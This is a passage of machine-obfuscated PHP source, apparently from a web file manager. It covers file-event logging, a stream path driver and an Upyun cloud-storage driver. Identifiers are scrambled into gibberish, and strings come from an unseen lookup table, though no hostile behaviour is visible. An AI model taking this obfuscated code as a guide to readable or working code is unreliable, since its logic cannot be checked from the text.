array_merge($­¢ıã¼ , $‚ Öë›ã); } $²Œô®¿[$ÄÆóˆ‹¸] = array_unique($­¢ıã¼ ); return $²Œô®¿[$ÄÆóˆ‹¸]; } public function authTargetInfoMake($‚ƒì–Ö) { $ÌüíËÆ¬ =& $_SERVER[¼èá¯æÙ]; $±ãËÜ = array(); $•™Å¶Âı = array(); foreach ($‚ƒì–Ö as $¬Ëû¸í) { if ($¬Ëû¸í[$ÌüíËÆ¬[200]] == SourceModel::TYPE_USER) { $±ãËÜ[] = intval($¬Ëû¸í[$ÌüíËÆ¬[580]]); } else { if ($¬Ëû¸í[$ÌüíËÆ¬[200]] == SourceModel::TYPE_GROUP) { $•™Å¶Âı[] = intval($¬Ëû¸í[$ÌüíËÆ¬[580]]); } } } if ($±ãËÜ) { $±ãËÜ = Model($ÌüíËÆ¬[588])->userListInfo($±ãËÜ); } if ($•™Å¶Âı) { $­Í‹ÂĞ = array($ÌüíËÆ¬[2071] => array($ÌüíËÆ¬[503], $•™Å¶Âı)); $•™Å¶Âı = Model($ÌüíËÆ¬[596])->field($ÌüíËÆ¬[2204])->where($­Í‹ÂĞ)->select(); $•™Å¶Âı = array_to_keyvalue($•™Å¶Âı, $ÌüíËÆ¬[1979]); } return array($ÌüíËÆ¬[2205] => $±ãËÜ, $ÌüíËÆ¬[2206] => $•™Å¶Âı); } public function authInfo($Öİ¥) { $ÌÍùÔ¼ô =& $_SERVER[¼èá¯æÙ]; if ($Öİ¥[$ÌÍùÔ¼ô[2087]]) { $ƒ„íÙâ = Model($ÌÍùÔ¼ô[582])->listData($Öİ¥[$ÌÍùÔ¼ô[2087]]); if (!$ƒ„íÙâ) { return !1; $‘¥®ÍàÓ = Model($ÌÍùÔ¼ô[582])->listData(); $ÊÉÃÊ“¨ = array_filter_by_field($‘¥®ÍàÓ, $ÌÍùÔ¼ô[498], $ÌÍùÔ¼ô[240]); return $ÊÉÃÊ“¨; } $ëÁÉÀæ÷ = array_field_key($ƒ„íÙâ, array($ÌÍùÔ¼ô[486], $ÌÍùÔ¼ô[32], $ÌÍùÔ¼ô[498], $ÌÍùÔ¼ô[2002], $ÌÍùÔ¼ô[2003])); $ëÁÉÀæ÷[$ÌÍùÔ¼ô[2207]] = $Öİ¥; return $ëÁÉÀæ÷; } else { return array($ÌÍùÔ¼ô[504] => 0, $ÌÍùÔ¼ô[1985] => $Öİ¥[$ÌÍùÔ¼ô[2151]], $ÌÍùÔ¼ô[505] => $ÌÍùÔ¼ô[12], $ÌÍùÔ¼ô[2002] => $ÌÍùÔ¼ô[2208]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\143\x65\x5f\145\166\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\155\x65", "\164\151\155\x65", "\151\x6e\163\x65\162\x74", "\146\165\x6e\143\164\x69\157\x6e"), array("\144\x65\x73\x63", '', "\151\156\163\x65\x72\164\54\165\160\x64\141\164\145\x2c\x73\x65\x6c\145\143\x74", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ëó°ğÎı, $õ„—×¤æ, $×ÉË•ÒÓ = '') { $¶‡–ı¡¸ =& $_SERVER[¼èá¯æÙ]; if (!$this->eventSave) { return; } $õÉŒîõË = Model($¶‡–ı¡¸[1426])->sourceInfo($ëó°ğÎı); if (!$õÉŒîõË) { return !1; } if ($this->isDisableEvent($õÉŒîõË, $õ„—×¤æ)) { return; } if ($×ÉË•ÒÓ && is_string($×ÉË•ÒÓ)) { $×ÉË•ÒÓ = array($¶‡–ı¡¸[2018] => $×ÉË•ÒÓ); } $°ˆëã’Ñ = defined($¶‡–ı¡¸[2209]) ? USER_ID : 0; $©®¸ÇÑ = array($¶‡–ı¡¸[502] => $ëó°ğÎı, $¶‡–ı¡¸[2210] => $õÉŒîõË[$¶‡–ı¡¸[202]], $¶‡–ı¡¸[2211] => $õÉŒîõË[$¶‡–ı¡¸[32]], $¶‡–ı¡¸[593] => !empty($õÉŒîõË[$¶‡–ı¡¸[593]]) ? $õÉŒîõË[$¶‡–ı¡¸[593]] : $¶‡–ı¡¸[12], $¶‡–ı¡¸[1769] => $°ˆëã’Ñ, $¶‡–ı¡¸[507] => $õ„—×¤æ, $¶‡–ı¡¸[1771] => $×ÉË•ÒÓ); $this->addSystemLog($õ„—×¤æ, $©®¸ÇÑ); unset($©®¸ÇÑ[$¶‡–ı¡¸[2211]], $©®¸ÇÑ[$¶‡–ı¡¸[593]]); return $this->add($©®¸ÇÑ); } private function addSystemLog($Â–åÛìä, $Æì€¹Á¤) { $½ø’¾Œó =& $_SERVER[¼èá¯æÙ]; if ($Â–åÛìä == $½ø’¾Œó[2212]) { $Â–åÛìä = $Æì€¹Á¤[$½ø’¾Œó[537]][$½ø’¾Œó[2213]]; } else { if (in_array($Â–åÛìä, array($½ø’¾Œó[1958], $½ø’¾Œó[2214]))) { $Â–åÛìä = $Æì€¹Á¤[$½ø’¾Œó[537]][$½ø’¾Œó[181]]; } } $è¨ã¤µ = array_merge($Æì€¹Á¤, array($½ø’¾Œó[2215] => $Æì€¹Á¤[$½ø’¾Œó[203]], $½ø’¾Œó[2216] => $Æì€¹Á¤[$½ø’¾Œó[2216]])); Hook::trigger($½ø’¾Œó[2217], $½ø’¾Œó[2218] . $Â–åÛìä, $Æì€¹Á¤); Model($½ø’¾Œó[1922])->addLog($½ø’¾Œó[2218] . $Â–åÛìä, $è¨ã¤µ); } private function isDisableEvent($­²şĞ­°, $¹ò‹’ÃÔ) { $ŠÖ¦Ôµ§ =& $_SERVER[¼èá¯æÙ]; if ($­²şĞ­°[$ŠÖ¦Ôµ§[200]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($¹ò‹’ÃÔ == $ŠÖ¦Ôµ§[1947]) { return !1; } return !0; } public function eventCreate($Ä¡‹áÇ, $Î‡×Ñ»¨) { $ÒÎ ƒü® =& $_SERVER[¼èá¯æÙ]; $£Ÿæîˆ‹ = Model($ÒÎ ƒü®[1426])->sourceInfo($Ä¡‹áÇ); $ä§íÂë’ = array($ÒÎ ƒü®[2213] => $Î‡×Ñ»¨, $ÒÎ ƒü®[32] => $£Ÿæîˆ‹[$ÒÎ ƒü®[32]]); return $this->addEvent($Ä¡‹áÇ, $ÒÎ ƒü®[2212], $ä§íÂë’); } public function eventFileEdit($çá‰¡è) { $î‚À’‰ =& $_SERVER[¼èá¯æÙ]; $³ùÙ¬Ÿ® = array($î‚À’‰[2219] => $_SERVER[$î‚À’‰[2220]], $î‚À’‰[2221] => strtolower(ACTION)); if (isset($GLOBALS[$î‚À’‰[7]][$î‚À’‰[2222]])) { $³ùÙ¬Ÿ®[$î‚À’‰[2222]] = $î‚À’‰[101]; } return $this->addEvent($çá‰¡è, $î‚À’‰[1948], $³ùÙ¬Ÿ®); } public function eventRecycle($¾´â¸É³, $¡ÊÓÛéˆ) { return $this->addEvent($¾´â¸É³, $_SERVER[¼èá¯æÙ][2214], $¡ÊÓÛéˆ); } private static $_removeLast = ''; public function eventRemove($Ø’¯´ˆ³) { $¶É¦ñşÖ =& $_SERVER[¼èá¯æÙ]; self::$_removeLast = $Ø’¯´ˆ³; $Íú©Ìª… = Model($¶É¦ñşÖ[1426])->sourceInfo($Ø’¯´ˆ³); $Í¤´¢èÎ = array_field_key($Íú©Ìª…, array($¶É¦ñşÖ[203], $¶É¦ñşÖ[552], $¶É¦ñşÖ[516], $¶É¦ñşÖ[595])); $Œ®Ãå¼À = array($¶É¦ñşÖ[181] => $Íú©Ìª…[$¶É¦ñşÖ[32]], $¶É¦ñşÖ[2221] => ACTION, $¶É¦ñşÖ[2223] => $Í¤´¢èÎ); return $this->addEvent($Íú©Ìª…[$¶É¦ñşÖ[202]], $¶É¦ñşÖ[1947], $Œ®Ãå¼À); } public function eventShare($õø’ÍÆ, $ŸûÛª¡±) { return $this->addEvent($õø’ÍÆ, $_SERVER[¼èá¯æÙ][1958], $ŸûÛª¡±); } public function eventMove($ÃÙÙˆİ, $®¶åïº , $¢¼ÍíÚ‰) { $ˆèü‚µ¶ =& $_SERVER[¼èá¯æÙ]; if (self::$_removeLast == $ÃÙÙˆİ) { return; } $¥Ö Œ­Õ = Model($ˆèü‚µ¶[1426]); $Ëİ”½Û = $¥Ö Œ­Õ->sourceInfo($ÃÙÙˆİ); $®Î™€üÛ = $¥Ö Œ­Õ->sourceInfo($®¶åïº ); $ç…ğ“•‘ = $¥Ö Œ­Õ->sourceInfo($¢¼ÍíÚ‰); $Ëªú’¿Û = array($ˆèü‚µ¶[1246] => $®¶åïº , $ˆèü‚µ¶[2224] => $®Î™€üÛ[$ˆèü‚µ¶[32]], $ˆèü‚µ¶[2200] => !empty($®Î™€üÛ[$ˆèü‚µ¶[593]]) ? $®Î™€üÛ[$ˆèü‚µ¶[593]] : $ˆèü‚µ¶[12], $ˆèü‚µ¶[1247] => $¢¼ÍíÚ‰, $ˆèü‚µ¶[2225] => $ç…ğ“•‘[$ˆèü‚µ¶[32]], $ˆèü‚µ¶[2226] => !empty($ç…ğ“•‘[$ˆèü‚µ¶[593]]) ? $ç…ğ“•‘[$ˆèü‚µ¶[593]] : $ˆèü‚µ¶[12]); $this->addEvent($ÃÙÙˆİ, $ˆèü‚µ¶[634], $Ëªú’¿Û); $Ëİ”½Û = $¥Ö Œ­Õ->sourceInfo($ÃÙÙˆİ); $Ëªú’¿Û = array($ˆèü‚µ¶[203] => $Ëİ”½Û[$ˆèü‚µ¶[203]], $ˆèü‚µ¶[32] => $Ëİ”½Û[$ˆèü‚µ¶[32]]); $this->addEvent($®¶åïº , $ˆèü‚µ¶[2227], $Ëªú’¿Û); } public function eventCopy($œŠæÑ‹½) { $this->eventCreate($œŠæÑ‹½, $_SERVER[¼èá¯æÙ][632]); } public function eventRename($ÁíßşÎï, $øüĞ½¬ª, $¥†™ÕŠƒ) { $’›Ñ¿Á =& $_SERVER[¼èá¯æÙ]; $†¼çâÈÑ = array($’›Ñ¿Á[1246] => $øüĞ½¬ª, $’›Ñ¿Á[1247] => $¥†™ÕŠƒ); return $this->addEvent($ÁíßşÎï, $’›Ñ¿Á[1440], $†¼çâÈÑ); } public function eventAddComment($¤ª¼ş±, $¤ÄâÕ†ò) { return $this->addEvent($¤ª¼ş±, $_SERVER[¼èá¯æÙ][2228], $¤ÄâÕ†ò); } public function eventAddDesc($Ğ·ëøİ, $öóé³±ú) { return $this->addEvent($Ğ·ëøİ, $_SERVER[¼èá¯æÙ][2229], $öóé³±ú); } public function listBySource($ÏøÊîÊú) { $§éğ±‡ğ =& $_SERVER[¼èá¯æÙ]; $ˆçŠ­“ï = Model($§éğ±‡ğ[1426])->sourceInfo($ÏøÊîÊú); $ÅÑšÜ— = array($§éğ±‡ğ[502] => $ÏøÊîÊú); if ($ˆçŠ­“ï[$§éğ±‡ğ[496]] == $§éğ±‡ğ[101]) { $æÄ“™â = Model($§éğ±‡ğ[1426])->listSearchChildren($ÏøÊîÊú, 20000); $æÄ“™â[] = $ÏøÊîÊú . $§éğ±‡ğ[63]; $ÅÑšÜ— = array($§éğ±‡ğ[203] => array($§éğ±‡ğ[7], $æÄ“™â)); } $ÆäÁÏíï = $this->where($ÅÑšÜ—)->order($§éğ±‡ğ[2230])->selectPage(); if ($ÆäÁÏíï[$§éğ±‡ğ[454]][$§éğ±‡ğ[455]] == 0) { $ÆäÁÏíï[$§éğ±‡ğ[454]][$§éğ±‡ğ[455]] = 1; $ÆäÁÏíï[$§éğ±‡ğ[457]] = array(array($§éğ±‡ğ[502] => $ÏøÊîÊú, $§éğ±‡ğ[2210] => $ˆçŠ­“ï[$§éğ±‡ğ[202]], $§éğ±‡ğ[1769] => $ˆçŠ­“ï[$§éğ±‡ğ[538]], $§éğ±‡ğ[507] => $§éğ±‡ğ[2231], $§éğ±‡ğ[508] => $ˆçŠ­“ï[$§éğ±‡ğ[243]], $§éğ±‡ğ[1771] => $§éğ±‡ğ[12])); } return $this->eventListParse($ÆäÁÏíï, $ÏøÊîÊú); } private function eventListParse($í«´Î¾, $ûö¿âµö) { $õíè‘ø =& $_SERVER[¼èá¯æÙ]; $ÄäÓ¿åã = $í«´Î¾[$õíè‘ø[457]]; $¹®Ô“íŒ = array_to_keyvalue($ÄäÓ¿åã, $õíè‘ø[12], $õíè‘ø[203]); $ºí¬‰¾Á = array_to_keyvalue($ÄäÓ¿åã, $õíè‘ø[12], $õíè‘ø[2216]); foreach ($ÄäÓ¿åã as $å¢¡›´ì) { $Şı˜È­Î = $å¢¡›´ì[$õíè‘ø[537]]; if ($å¢¡›´ì[$õíè‘ø[33]] == $õíè‘ø[634] && isset($Şı˜È­Î[$õíè‘ø[1246]])) { $¹®Ô“íŒ[] = $Şı˜È­Î[$õíè‘ø[1246]] . $õíè‘ø[12]; $¹®Ô“íŒ[] = $Şı˜È­Î[$õíè‘ø[1247]] . $õíè‘ø[12]; } if ($å¢¡›´ì[$õíè‘ø[33]] == $õíè‘ø[2227] && isset($Şı˜È­Î[$õíè‘ø[203]])) { $¹®Ô“íŒ[] = $Şı˜È­Î[$õíè‘ø[203]] . $õíè‘ø[12]; } } $¹®Ô“íŒ = array_merge($¹®Ô“íŒ, $ºí¬‰¾Á, array($ûö¿âµö . $õíè‘ø[12])); $¹®Ô“íŒ = array_unique($¹®Ô“íŒ); $Æ¦úøØ = array_unique(array_to_keyvalue($ÄäÓ¿åã, $õíè‘ø[12], $õíè‘ø[1778])); $ºÔñ‰ ó = Model($õíè‘ø[608])->userListInfo($Æ¦úøØ); $ã½ÙİÊ = Model($õíè‘ø[907])->sourceListInfo($¹®Ô“íŒ, !0); foreach ($ÄäÓ¿åã as &$å¢¡›´ì) { if ($å¢¡›´ì[$õíè‘ø[33]] == $õíè‘ø[634] && isset($å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[1246]])) { $å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[1246]] = $ã½ÙİÊ[$å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[1246]]]; $å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[1247]] = $ã½ÙİÊ[$å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[1247]]]; } if ($å¢¡›´ì[$õíè‘ø[33]] == $õíè‘ø[2227] && isset($å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[203]])) { $å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[203]] = $ã½ÙİÊ[$å¢¡›´ì[$õíè‘ø[537]][$õíè‘ø[203]]]; } $å¢¡›´ì[$õíè‘ø[100]] = $ã½ÙİÊ[$å¢¡›´ì[$õíè‘ø[203]]]; $å¢¡›´ì[$õíè‘ø[2232]] = $ã½ÙİÊ[$å¢¡›´ì[$õíè‘ø[2216]]]; if ($å¢¡›´ì[$õíè‘ø[33]] == $õíè‘ø[1947]) { $å¢¡›´ì[$õíè‘ø[2232]] = $å¢¡›´ì[$õíè‘ø[100]]; $å¢¡›´ì[$õíè‘ø[2216]] = $å¢¡›´ì[$õíè‘ø[2232]][$õíè‘ø[203]]; $å¢¡›´ì[$õíè‘ø[100]] = !1; $å¢¡›´ì[$õíè‘ø[203]] = $õíè‘ø[12]; } $å¢¡›´ì[$õíè‘ø[2159]] = $ºÔñ‰ ó[$å¢¡›´ì[$õíè‘ø[1778]]]; } unset($å¢¡›´ì); $í«´Î¾[$õíè‘ø[457]] = $ÄäÓ¿åã; return $í«´Î¾; } public function removeBySource($Ç´£ÎÙ·) { $Åªìï¡Ø = array($_SERVER[¼èá¯æÙ][502] => $Ç´£ÎÙ·); $this->where($Åªìï¡Ø)->remove(); } } goto BÊñÆõÀ‚; C¶Ûíè†×‹: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($€ù•ÊÛ“, $àËˆøªõ = 0) { parent::__construct(); $this->source = $€ù•ÊÛ“; $this->sourceSize = $àËˆøªõ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ã¤½®è” = false) { return $this->sourceSize; } public function getContent($¢Ù“í¥¨ = false) { return $this->fileSubstr($¢Ù“í¥¨, 0, $this->sourceSize); } public function fileSubstr($İ´ˆ = false, $ŒüòŸ±¶ = 0, $¤ÚÎ¡È = 0) { if (!$¤ÚÎ¡È) { $¤ÚÎ¡È = $this->sourceSize; } $ôŸÙš‰¥ = $this->sourceSize - $ŒüòŸ±¶; if ($¤ÚÎ¡È >= $ôŸÙš‰¥) { $¤ÚÎ¡È = $ôŸÙš‰¥; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ŒüòŸ±¶, $¤ÚÎ¡È); } if ($this->sourceType == self::TYPE_FILE) { if ($¤ÚÎ¡È <= 0) { return $_SERVER[¼èá¯æÙ][12]; } $ù±Ç‹êÌ = ftell($this->source); fseek_64($this->source, $ù±Ç‹êÌ + $ŒüòŸ±¶); $»‰Õ…À… = @fread($this->source, $¤ÚÎ¡È); fseek_64($this->source, $ù±Ç‹êÌ); return $»‰Õ…À…; } } public function hashMd5($ÅÒõßÉÏ = false) { return md5($this->getContent()); } public static function hash($šÎóş˜, $ƒ¥ä”¨˜ = 0) { $Å¬å‘Ö† = new PathDriverStream($šÎóş˜, $ƒ¥ä”¨˜); return $Å¬å‘Ö†->hashSimple($šÎóş˜); } public static function md5($Éæà¤Æ›, $çßş†¹¸ = 0) { $ßĞ¶Éñ– = new PathDriverStream($Éæà¤Æ›, $çßş†¹¸); return $ßĞ¶Éñ–->hashMd5($Éæà¤Æ›); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\x76\x30\x2e\141\160\151\x2e\165\160\171\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($³Æ‰¿‰¾) { parent::__construct(); $this->_init($³Æ‰¿‰¾); } public function _init($ìµö¤†Ã) { $ŒÂ·˜à€ =& $_SERVER[¼èá¯æÙ]; foreach ($ìµö¤†Ã as $®º˜Ó× => $­Çß¨È) { if (isset($this->{$®º˜Ó×})) { $this->{$®º˜Ó×} = $­Çß¨È; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ŒÂ·˜à€[1551] . LNG($ŒÂ·˜à€[1470])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¤óğÈ®—, $ÀÏÚÉÚ  = "\x47\x45\x54") { $ğ¿´‡ =& $_SERVER[¼èá¯æÙ]; $Õ¿½±°³ = gmdate($ğ¿´‡[1499]); $èôŠûÃ = base64_encode(hash_hmac($ğ¿´‡[1552], "{$ÀÏÚÉÚ }\46{$¤óğÈ®—}\x26{$Õ¿½±°³}", md5("{$this->userpass}"), !0)); $Áç®Óˆ = array("\101\x75\164\x68\157\x72\151\x7a\141\x74\151\157\x6e\72\x55\x50\x59\125\x4e\40{$this->username}\72{$èôŠûÃ}", "\104\x61\x74\x65\x3a{$Õ¿½±°³}"); return $Áç®Óˆ; } public function ussRequest($ÆÎ²•ê’, $¨ÚÃÈ‰ = "\107\105\124", $ïñ¤òÉÜ = false, $ˆÏÄŞ¥î = false, $áŠ‡†… = false) { $ğÔŒêŞˆ =& $_SERVER[¼èá¯æÙ]; $ÆÎ²•ê’ = trim($ÆÎ²•ê’, $ğÔŒêŞˆ[8]); $Û¶“·°æ = "\x2f{$this->bucket}\x2f" . rawurlencode($ÆÎ²•ê’); $×ì¦„ñå = $this->ussHeaders($Û¶“·°æ, $¨ÚÃÈ‰); if ($ˆÏÄŞ¥î) { $×ì¦„ñå = array_merge($×ì¦„ñå, $ˆÏÄŞ¥î); } $ƒ³¡€¶æ = url_request($this->endpoint . $Û¶“·°æ, $¨ÚÃÈ‰, $ïñ¤òÉÜ, $×ì¦„ñå, $áŠ‡†…); if (!$ƒ³¡€¶æ) { $Ÿì“ïŒ– = LNG($ğÔŒêŞˆ[1553]); $this->writeLog($Ÿì“ïŒ–); return array($ğÔŒêŞˆ[1302] => !1, $ğÔŒêŞˆ[1292] => $Ÿì“ïŒ–); } if (strtolower($¨ÚÃÈ‰) == $ğÔŒêŞˆ[239] || in_array($ƒ³¡€¶æ[$ğÔŒêŞˆ[1302]], array($ğÔŒêŞˆ[273], $ğÔŒêŞˆ[1554]))) { $ïñ¤òÉÜ = $ƒ³¡€¶æ[$ğÔŒêŞˆ[1555]]; if (!$ƒ³¡€¶æ[$ğÔŒêŞˆ[832]]) { $ïñ¤òÉÜ = isset($ïñ¤òÉÜ[0]) ? $ïñ¤òÉÜ[0] : $ğÔŒêŞˆ[12]; } } else { $ïñ¤òÉÜ = json_decode($ƒ³¡€¶æ[$ğÔŒêŞˆ[1292]], !0); if (!$ïñ¤òÉÜ) { $ïñ¤òÉÜ = $ƒ³¡€¶æ[$ğÔŒêŞˆ[1292]]; } else { if (!$ƒ³¡€¶æ[$ğÔŒêŞˆ[832]] && isset($ïñ¤òÉÜ[$ğÔŒêŞˆ[1556]])) { $ïñ¤òÉÜ = $ïñ¤òÉÜ[$ğÔŒêŞˆ[1556]]; } } } if (!$ƒ³¡€¶æ[$ğÔŒêŞˆ[832]]) { $this->writeLog($this->__errorMessage($ïñ¤òÉÜ)); } return array($ğÔŒêŞˆ[1302] => $ƒ³¡€¶æ[$ğÔŒêŞˆ[832]], $ğÔŒêŞˆ[1292] => $ïñ¤òÉÜ); } private function __errorMessage($¯Ñ·áµ) { $¨µÕ•¬ =& $_SERVER[¼èá¯æÙ]; if (!$¯Ñ·áµ) { return $¨µÕ•¬[12]; } static $ªŠ…™ = null; if (!$ªŠ…™) { $ªŠ…™ = I18n::getType(); } if ($ªŠ…™ != $¨µÕ•¬[1509]) { return $¯Ñ·áµ; } $Ë¨ãÄÏò = array($¨µÕ•¬[1557] => $¨µÕ•¬[1558], $¨µÕ•¬[1559] => $¨µÕ•¬[1560], $¨µÕ•¬[1561] => $¨µÕ•¬[1560], $¨µÕ•¬[1562] => $¨µÕ•¬[1563], $¨µÕ•¬[1564] => $¨µÕ•¬[1565], $¨µÕ•¬[1566] => $¨µÕ•¬[1567], $¨µÕ•¬[1568] => $¨µÕ•¬[1569]); return isset($Ë¨ãÄÏò[$¯Ñ·áµ]) ? $Ë¨ãÄÏò[$¯Ñ·áµ] : $¯Ñ·áµ; } public function mkfile($™ŒùÏÜ, $»›üõüë = '', $ ©û¸ñğ = REPEAT_RENAME) { if ($this->setContent($™ŒùÏÜ, $»›üõüë)) { return $this->getPathOuter($™ŒùÏÜ); } return !1; } public function mkdir($œïè´ûÒ, $“©¶‘ÇÓ = REPEAT_SKIP) { $ÍÍíŸë =& $_SERVER[¼èá¯æÙ]; $ŠÒşˆÜ¨ = trim($œïè´ûÒ, $ÍÍíŸë[8]); if ($this->_isFolder($ŠÒşˆÜ¨)) { return $this->getPathOuter($ŠÒşˆÜ¨); } $ñÑúĞŞ‰ = array($ÍÍíŸë[1570]); $Ë€Ù›Éˆ = $this->ussRequest($ŠÒşˆÜ¨, $ÍÍíŸë[299], !1, $ñÑúĞŞ‰); return $Ë€Ù›Éˆ[$ÍÍíŸë[1302]] ? $this->getPathOuter($ŠÒşˆÜ¨) : !1; } public function copyFile($Î»êºº±, $»å÷´âÌ) { $¸Çù¦ı =& $_SERVER[¼èá¯æÙ]; $ÔÇ¾İŞ = array($¸Çù¦ı[1571] . "\x2f{$this->bucket}\57{$Î»êºº±}", $¸Çù¦ı[1572]); $´Øúóõ = $this->ussRequest($»å÷´âÌ, $¸Çù¦ı[265], !1, $ÔÇ¾İŞ); return $´Øúóõ[$¸Çù¦ı[1302]] ? !0 : $this->getPathOuter($»å÷´âÌ); } public function moveFile($ÅâÌöÉ±, $äæŸÚø–) { $¹Ä†Íì =& $_SERVER[¼èá¯æÙ]; $Æ–°—ê = array($¹Ä†Íì[1573] . "\57{$this->bucket}\x2f{$ÅâÌöÉ±}", $¹Ä†Íì[1572]); $‹õÓË = $this->ussRequest($äæŸÚø–, $¹Ä†Íì[265], !1, $Æ–°—ê); return $‹õÓË[$¹Ä†Íì[1302]] ? !0 : $this->getPathOuter($äæŸÚø–); } public function delFile($Ëï÷¸ğÎ) { $ú»×„ŠĞ =& $_SERVER[¼èá¯æÙ]; $£ğÖ…­ = $this->ussRequest($Ëï÷¸ğÎ, $ú»×„ŠĞ[1574]); return $£ğÖ…­[$ú»×„ŠĞ[1302]] ? !0 : !1; } public function delFolder($Âßì•Şº) { $ÚŒõ–ãô =& $_SERVER[¼èá¯æÙ]; if (!$this->exist($Âßì•Şº)) { return !0; } $this->listItemCache = !1; $´÷Óº‡Ç = $Æøìñ¡ª = array(); $this->fileList($Âßì•Şº, $´÷Óº‡Ç, $Æøìñ¡ª, !0); $this->listItemCache = !0; foreach ($Æøìñ¡ª as $–í£—÷) { $›È™ùŠÄ = $this->ussRequest($–í£—÷[$ÚŒõ–ãô[32]], $ÚŒõ–ãô[1574]); if (!$›È™ùŠÄ[$ÚŒõ–ãô[1302]]) { return !1; } } usort($´÷Óº‡Ç, function ($ïÔğ‰Æç, $¨öÆ£Ş‹) { $Ã‡¹í‰ =& $_SERVER[¼èá¯æÙ]; return substr_count($¨öÆ£Ş‹, $Ã‡¹í‰[8]) - substr_count($ïÔğ‰Æç, $Ã‡¹í‰[8]); }); foreach ($´÷Óº‡Ç as $ø¨ßÔ”•) { $›È™ùŠÄ = $this->ussRequest($ø¨ßÔ”•, $ÚŒõ–ãô[1574]); if (!$›È™ùŠÄ[$ÚŒõ–ãô[1302]]) { return !1; } } $›È™ùŠÄ = $this->ussRequest($Âßì•Şº, $ÚŒõ–ãô[1574]); return $›È™ùŠÄ[$ÚŒõ–ãô[1302]]; } public function rename($š©Í‰“Ô, $©‰˜ïÃÛ) { if ($this->isFile($š©Í‰“Ô)) { $©‰˜ïÃÛ = get_path_father($š©Í‰“Ô) . $©‰˜ïÃÛ; return $this->moveFile($š©Í‰“Ô, $©‰˜ïÃÛ); } return $this->renameObject($š©Í‰“Ô, $©‰˜ïÃÛ); } public function fileInfo($ÈŠ¬ÈÓ , $õÜÜÈÂä = false, $ïÓã–ç = array()) { $”Ø–ØÀÈ =& $_SERVER[¼èá¯æÙ]; $ÊÇ„ÌÌ• = array($”Ø–ØÀÈ[32] => $this->pathThis($ÈŠ¬ÈÓ ), $”Ø–ØÀÈ[97] => $this->getPathOuter($”Ø–ØÀÈ[8] . $ÈŠ¬ÈÓ ), $”Ø–ØÀÈ[33] => $”Ø–ØÀÈ[242], $”Ø–ØÀÈ[89] => isset($ïÓã–ç[$”Ø–ØÀÈ[89]]) ? $ïÓã–ç[$”Ø–ØÀÈ[89]] : 0, $”Ø–ØÀÈ[179] => $this->ext($ÈŠ¬ÈÓ )); if ($õÜÜÈÂä) { return $ÊÇ„ÌÌ•; } $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[243]] = $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[98]] = 0; $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[244]] = $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[245]] = !0; if (empty($ïÓã–ç)) { $ïÓã–ç = $this->objectMeta($ÈŠ¬ÈÓ ); if (!$ïÓã–ç) { return $ÊÇ„ÌÌ•; } } $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[243]] = intval($ïÓã–ç[$”Ø–ØÀÈ[1575]]); $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[98]] = intval($ïÓã–ç[$”Ø–ØÀÈ[1576]]); $ÊÇ„ÌÌ•[$”Ø–ØÀÈ[89]] = $ïÓã–ç[$”Ø–ØÀÈ[89]]; return $ÊÇ„ÌÌ•; } public function folderInfo($»Ùõ‡“§, $ë¼‰Îñ¼ = false) { $ßŞÆÈ¦ =& $_SERVER[¼èá¯æÙ]; $°ç­£Ñİ = array($ßŞÆÈ¦[32] => $this->pathThis($»Ùõ‡“§), $ßŞÆÈ¦[97] => $this->getPathOuter($ßŞÆÈ¦[8] . $»Ùõ‡“§), $ßŞÆÈ¦[33] => $ßŞÆÈ¦[88]); if ($ë¼‰Îñ¼) { return $°ç­£Ñİ; } $°ç­£Ñİ[$ßŞÆÈ¦[243]] = $°ç­£Ñİ[$ßŞÆÈ¦[98]] = 0; $°ç­£Ñİ[$ßŞÆÈ¦[244]] = $°ç­£Ñİ[$ßŞÆÈ¦[245]] = !0; if (empty($µ±ÙõëÑ)) { $µ±ÙõëÑ = $this->objectMeta($»Ùõ‡“§); if (!$µ±ÙõëÑ) { return $°ç­£Ñİ; } } $°ç­£Ñİ[$ßŞÆÈ¦[243]] = intval($µ±ÙõëÑ[$ßŞÆÈ¦[1575]]); $°ç­£Ñİ[$ßŞÆÈ¦[98]] = intval($µ±ÙõëÑ[$ßŞÆÈ¦[1576]]); return $°ç­£Ñİ; } private function listObjs($ûßú¿Áã, $Ç¿½ˆ¹ = 0, $êôÛ€½ = 1000) { $Èà£­ãş =& $_SERVER[¼èá¯æÙ]; $¢Ìäà· = array($Èà£­ãş[1577], $Èà£­ãş[1578] . $êôÛ€½); if ($Ç¿½ˆ¹) { $¢Ìäà·[] = $Èà£­ãş[1579] . $Ç¿½ˆ¹; } $×æÄ›¹ = $this->ussRequest($ûßú¿Áã, $Èà£­ãş[1501], !1, $¢Ìäà·); return !$×æÄ›¹[$Èà£­ãş[1302]] ? !1 : $×æÄ›¹[$Èà£­ãş[1292]]; } private function fileList($ÁÑÕÎ‘õ, &$ßöÑ¼¹Å, &$àÖØîËÔ, 